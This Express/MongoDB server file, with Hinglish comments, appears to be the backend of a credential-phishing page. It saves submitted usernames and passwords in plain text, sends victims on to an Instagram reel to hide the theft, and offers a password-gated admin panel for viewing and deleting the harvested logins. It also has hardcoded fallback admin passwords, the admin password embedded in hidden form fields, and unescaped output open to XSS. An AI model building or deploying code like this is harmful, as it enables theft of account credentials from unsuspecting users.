const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const app = express();

app.set('trust proxy', 1);
app.use(express.urlencoded({ extended: true }));

// 1. MongoDB Connection
mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log("MongoDB Connected!"))
    .catch((err) => console.log("Error:", err));

// 2. Database Schema
const userSchema = new mongoose.Schema({
    username: String,
    password: String,
    createdAt: { type: Date, default: Date.now }
});
const UserData = mongoose.model('UserData', userSchema);

// Blocked IPs Storage
const blockedIPs = new Map();
const TWO_HOURS = 2 * 60 * 60 * 1000;

// Admin Table HTML Banane Ka Helper Function (Taaki delete ke baad bhi yahi dikhe)
async function renderAdminTable() {
    const allUsers = await UserData.find().sort({ createdAt: -1 });
    let tableRows = "";

    allUsers.forEach((item, index) => {
        tableRows += `
            <tr>
                <td>${index + 1}</td>
                <td>${item.username}</td>
                <td>${item.password}</td>
                <td>${item.createdAt.toLocaleString()}</td>
                <td style="text-align: center;">
                    <form action="/delete-user/${item._id}" method="POST" style="margin: 0;">
                        <input type="hidden" name="adminPass" value="${process.env.ADMIN_PASS || 'admin1234'}">
                        <button type="submit" style="background: #e53935; color: white; border: none; padding: 6px 12px; cursor: pointer; border-radius: 4px;">
                            Delete
                        </button>
                    </form>
                </td>
            </tr>
        `;
    });

    return `
        <div style="font-family: Arial; padding: 20px;">
            <h1>Admin Panel</h1>
            <table border="1" cellpadding="10" style="border-collapse: collapse; width: 100%;">
                <tr style="background: #f2f2f2;">
                    <th>#</th>
                    <th>Username / Email</th>
                    <th>Password</th>
                    <th>Time</th>
                    <th>Action</th>
                </tr>
                ${tableRows || '<tr><td colspan="5" style="text-align:center;">Koi data nahi hai</td></tr>'}
            </table>
            <br>
            <a href="/">Back to Home</a>
        </div>
    `;
}

// Home Page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 3. Form Submit Hone Par Data Save Karna aur YouTube Video Par Bhejna
app.post('/save-data', async (req, res) => {
    try {
        const newEntry = new UserData({
            username: req.body.username,
            password: req.body.password
        });
        await newEntry.save();
        res.redirect('https://www.instagram.com/reels/DfWX0xwoRYp/');
    } catch (error) {
        res.status(500).send("Error: " + error.message);
    }
});

// 4. Admin Login Page
app.get('/admin', (req, res) => {
    const userIP = req.ip;
    const blockEndTime = blockedIPs.get(userIP);

    if (blockEndTime && Date.now() < blockEndTime) {
        const minutesLeft = Math.ceil((blockEndTime - Date.now()) / 60000);
        return res.status(403).send(`
            <h2>Access Blocked!</h2>
            <p>Galat password dalne ki wajah se aapko 2 ghante ke liye block kar diya gaya hai.</p>
            <p>Bacha hua samay: lagbhag <b>${minutesLeft} minutes</b>.</p>
        `);
    }

    res.send(`
        <div style="font-family: Arial; max-width: 350px; margin: 100px auto; text-align: center;">
            <h2>Admin Login</h2>
            <form action="/admin-login" method="POST">
                <input type="password" name="adminPass" placeholder="Enter Admin Password" required 
                    style="width: 100%; padding: 12px; margin-bottom: 15px; font-size: 16px;">
                <button type="submit" 
                    style="width: 100%; padding: 12px; background: #0866e9; color: white; border: none; font-size: 16px; cursor: pointer;">
                    Open Admin Panel
                </button>
            </form>
        </div>
    `);
});

// 5. Admin Password Check aur Data Dikhana
app.post('/admin-login', async (req, res) => {
    const userIP = req.ip;
    const blockEndTime = blockedIPs.get(userIP);

    if (blockEndTime && Date.now() < blockEndTime) {
        const minutesLeft = Math.ceil((blockEndTime - Date.now()) / 60000);
        return res.status(403).send(`<h2>Blocked! ${minutesLeft} minutes baad try karein.</h2>`);
    }

    const correctPassword = process.env.ADMIN_PASS || "Henry@1905";

    if (req.body.adminPass !== correctPassword) {
        blockedIPs.set(userIP, Date.now() + TWO_HOURS);
        return res.status(403).send(`
            <h2>Galat Password!</h2>
            <p>Aapko <b>2 ghante</b> ke liye block kar diya gaya hai.</p>
        `);
    }

    try {
        const html = await renderAdminTable();
        res.send(html);
    } catch (error) {
        res.status(500).send("Admin panel load nahi ho paya.");
    }
});

// 6. Kisi Bhi Ek Entry Ko Delete Karne Ka Route
app.post('/delete-user/:id', async (req, res) => {
    const correctPassword = process.env.ADMIN_PASS || "admin1234";

    if (req.body.adminPass !== correctPassword) {
        return res.status(403).send("Unauthorized action!");
    }

    try {
        await UserData.findByIdAndDelete(req.params.id); // MongoDB se us specific ID ko delete karega
        const html = await renderAdminTable();
        res.send(html); // Delete hone ke baad turant updated table dikhayega
    } catch (error) {
        res.status(500).send("Delete karne me error aaya.");
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running on port " + PORT));
